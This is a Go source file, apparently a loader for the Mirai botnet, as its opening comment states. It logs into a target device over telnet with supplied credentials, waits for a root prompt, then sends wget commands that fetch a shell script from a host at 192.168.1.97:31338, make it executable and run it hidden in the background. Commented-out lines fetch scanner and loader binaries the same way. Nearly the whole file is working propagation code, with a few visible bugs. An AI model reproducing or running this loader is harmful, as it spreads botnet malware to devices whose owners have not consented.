//Will load MIRAI onto the device
package main

import (
	"fmt"
	"net"
	"strings"
	"time"
	"os"
)
var (
	__TIMEOUT__ = 3 *time.Second
)

func login22(usr string , psw string){


	
}

func login23(usr string , psw string,ip string,port string){
	fmt.Printf("[loader] login %s..\n", ip)
	conn, err := net.DialTimeout("tcp", ip + ":"+port, __TIMEOUT__)
	defer conn.Close()
	if err == nil {
		for{
			s:=""
			for {
				time.Sleep(1 * time.Second)
				buf := make([]byte, 256)
				conn_word,err:=conn.Read(buf)
				if err==nil{
					s = string(buf[:conn_word])
					if strings.Contains(s,"#"){
						fmt.Println("Sucessful")
						break 
					}
					if strings.Contains(s,"login")||strings.Contains(s,"Login")||strings.Contains(s,"password")||strings.Contains(s,"Password"){
						break
					}
				}else{
					return
				}
			}	
			if strings.Contains(s,"login")||strings.Contains(s,"Login")||strings.Contains(s,"username"){
				conn.Write([]byte(usr+"\n"))
			}
			if strings.Contains(s,"password")||strings.Contains(s,"Password"){
				conn.Write([]byte(psw+"\n"))
			}
			if strings.Contains(s,"#"){
				conn.Write([]byte("which wget && curl"+"\n"))
				if strings.Contains(s,"wget"){
					//cmd:="wget http://192.168.1.97:31338/scanner"+" && "+"wget http://192.168.1.97:31338/loader"
					//conn.Write([]byte("wget http://192.168.1.97:31338/scanner"+"\n"))
					//time.Sleep(10 * time.Second)
					//conn.Write([]byte("wget http://192.168.1.97:31338/loader"+"\n"))
					cmd:="wget http://192.168.1.97:31338/wget_download_exec.sh"
					conn.Write([]byte(cmd+"\n"))
					time.Sleep( 3 * time.Second)
					//conn.Write([]byte("chmod +x scanner"+"\n"))
					//conn.Write([]byte("chmod +x loader"+"\n"))
					conn.Write([]byte("chmod +x wget_download_exec.sh"+"\n"))
					time.Sleep( 1 * time.Second)
					conn.Write([]byte("nohup ./wget_download_exec.sh > /dev/null 2>&1 &"+"\n"))
					time.Sleep( 1 * time.Second)
					return
				}
				if strings.Contains(s,"curl"){
					cmd:="wget http://192.168.1.97:31338/curl_download_exec.sh"
					conn.Write([]byte(cmd+"\n"))
					time.Sleep( 3 * time.Second)
					conn.Write([]byte("chmod +x curl_download_exec.sh"+"\n"))
					time.Sleep( 1 * time.Second)
					conn.Write([]byte("nohup ./curl_download_exec.sh > /dev/null 2>&1 &"+"\n"))
					time.Sleep( 1 * time.Second)
					//conn.Write([]byte("curl http://192.168.1.97:31338/scanner -o scanner"+"\n"))
					//conn.Write([]byte("curl http://192.168.1.97:31338/loader -o loader"+"\n"))
					//conn.Write([]byte("chmod +x scanner"+"\n"))
					//conn.Write([]byte("chmod +x loader"+"\n"))
					return
				}
			}
		}
	}else {
		return 
	}
}

func main(){

	if len(os.Args)<1{
		fmt.Println("Error")
	}else{
		switch os.Args[4] {
			case "23":
				//login23("admin","password","192.168.1.181","23")	
				login23(os.Args[1],os.Args[2],os.Args[3],os.Args[4])
			case "2323":
				//login23("admin","password","192.168.1.181","23")	
				//login23(os.Args[1],os.Args[2],os.Args[3],os.Args[4])
			case "22":
				//login22(os.Args[1],os.Args[2],os.Args[3],os.Args[4])
		}
	}
}